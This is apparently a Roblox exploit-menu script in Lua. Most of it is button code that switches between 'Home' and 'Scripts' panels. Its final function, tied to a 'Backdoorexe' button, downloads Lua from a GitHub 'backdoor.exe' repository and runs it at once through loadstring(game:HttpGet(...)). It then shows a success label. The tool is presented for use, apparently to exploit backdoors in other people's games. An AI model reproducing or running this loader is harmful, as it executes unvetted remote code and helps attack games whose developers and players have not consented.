-- Scripts:


local function MJACF_fake_script() -- Scripts.Script 
	local script = Instance.new('Script', Scripts)

	local n = script.Parent.Name
	local findme = script.Parent.Parent.Parent:FindFirstChild(n)
	local colour = Color3.fromRGB(170, 0, 0)
	local notcolour = Color3.fromRGB(15,15,15)
	
	script.Parent.MouseButton1Down:Connect(function()
		findme:TweenPosition(UDim2.new(0, 0,-0.001, 0))
		wait(0.3)
		script.Parent.Parent.Parent.Home.Visible = false
		findme.Visible = true
		wait(0.5)
		findme.BackgroundTransparency = 1
		script.Parent.BackgroundColor3 = colour
	
		script.Parent.Parent.Parent.Home.Position = UDim2.new(-1, 0,-0.001, 0)
		script.Parent.Parent.Home.BackgroundColor3 = notcolour
	end)
end
coroutine.wrap(MJACF_fake_script)()
local function SWDYAWB_fake_script() -- Home.Script 
	local script = Instance.new('Script', Home)

	local n = script.Parent.Name
	local findme = script.Parent.Parent.Parent:FindFirstChild(n)
	local colour = Color3.fromRGB(170, 0, 0)
	local notcolour = Color3.fromRGB(15,15,15)
	
	script.Parent.MouseButton1Down:Connect(function()
		findme:TweenPosition(UDim2.new(0, 0,-0.001, 0))
		wait(0.3)
		script.Parent.Parent.Parent.Scripts.Visible = false
		findme.Visible = true
		wait(0.5)
		findme.BackgroundTransparency = 1
		script.Parent.BackgroundColor3 = colour
		
		script.Parent.Parent.Parent.Scripts.Position = UDim2.new(-1, 0,-0.001, 0)
		script.Parent.Parent.Scripts.BackgroundColor3 = notcolour
	end)
end
coroutine.wrap(SWDYAWB_fake_script)()
local function KBMVWR_fake_script() -- Backdoorexe.LocalScript 
	local script = Instance.new('LocalScript', Backdoorexe)

	script.Parent.MouseButton1Down:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"))()
		
		script.Parent.Success.Visible = true
		wait(5)
		script.Parent.Success.Visible = false
	end)
end
